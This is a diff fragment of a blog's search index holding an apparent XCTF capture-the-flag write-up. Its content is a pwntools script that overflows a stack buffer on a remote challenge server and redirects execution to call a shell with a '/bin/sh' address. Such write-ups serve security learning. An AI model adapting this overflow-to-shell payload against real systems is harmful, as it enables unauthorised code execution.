+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>pwn</category>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>wp</tag>
+        <tag>xctf</tag>
+        <tag>pwn</tag>
       </tags>
   </entry>
 </search>
